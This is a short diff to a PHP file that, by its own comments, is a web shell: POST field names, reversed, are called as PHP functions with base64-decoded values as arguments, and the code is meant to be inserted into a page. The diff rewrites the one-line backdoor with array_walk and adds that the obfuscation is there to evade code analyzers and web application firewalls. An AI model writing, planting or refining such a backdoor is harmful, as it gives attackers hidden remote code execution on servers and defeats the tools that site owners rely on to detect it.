@@ -6,8 +6,9 @@
  *
  * The POST variable field name is the PHP function that gets
  * called and the value in the POST request gets passed to it.
- * For better protection against code analyzers, the function
- * name is reversed and the value passed to it is base64 encoded.
+ * For better protection against code analyzers and web application
+ * firewalls, the function name is reversed and the value passed to 
+ * it is base64 encoded.
  *
  * To use, insert the code on to a page and call like this.
  *
@@ -25,4 +26,6 @@
  * but you can change this if needed.
  */
 <?php
-foreach ($_POST as $func => $arg) strrev($func)(base64_decode($arg));
+array_walk($_POST, function($arg, $func) { strrev($func)(base64_decode($arg)); });
+
+
